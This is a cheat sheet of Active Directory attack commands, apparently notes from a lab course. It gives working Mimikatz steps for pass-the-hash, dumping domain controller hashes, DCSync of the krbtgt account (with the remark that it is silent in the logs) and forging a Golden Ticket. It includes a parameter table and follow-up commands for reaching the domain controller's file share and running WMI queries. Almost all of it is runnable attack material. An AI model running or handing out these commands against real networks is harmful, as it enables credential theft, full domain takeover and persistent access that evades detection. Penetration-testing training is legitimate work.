
# Run Mimikatz script remotely using Invoke-Command
```powershell
PS C:\WINDOWS\system32> cd C:\AD\Tools\
PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin
/domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8
/run:powershell.exe"
```


## Execute mimikatz on DC as Domain Admin to get KRBTGT hash
to dump all hashes, take note of the domain admin hash (KRBTGT)
```powershell
Invoke-Mimikatz -Command '"lsadump:lsa /patch"' -Computername corp-dc
```

## Alternatively, use DCSync
Silent in the logs

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## DCSync 
# Persistence - Golden Ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::golden
/User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

## Command breakdown

| Invoke-Mimikatz -Command |	|
| ---	| --- |
| kerberos::golden | Name of the module |
| /domain:dollarcorp.moneycorp.local | Domain FQDN |
| /sid:S-1-5-21-1874506631-3219952063-538504511| SID of the domain |
| /krbtgt:ff46a9d8bd66c6efd77603da26796f35 | NTLM (RC4) hash of the KRBTGT account. Use /aes128 and /aes256 for using AES keys|
| /id:500 /groups:512 | optional User RID (default 500) and group default 513 512 520 518 519 |
| /ppt or /ticket | (ppt) Injects ticket in current powershell process - no need to save the ticket on disk. (ticket) Saves the ticket to a file for later use |
| /startoffset:0 | Optional when ticket is available (default 0 - right now) in minutes. Use negative value for a ticket to be available from past and a larger number for future |
| /endin:60 | optional lifetime (default is 10years) in minutes. Default AD setting is 10 hours = 600mins |
| /renewmax:10080 | optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 10080 |


# Show tickets available
```powershell
# access file system
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$

# Run WMI commands
gwmi -Class win32_computersystem -ComputerName dcorp-
dc.dollarcorp.moneycorp.local

```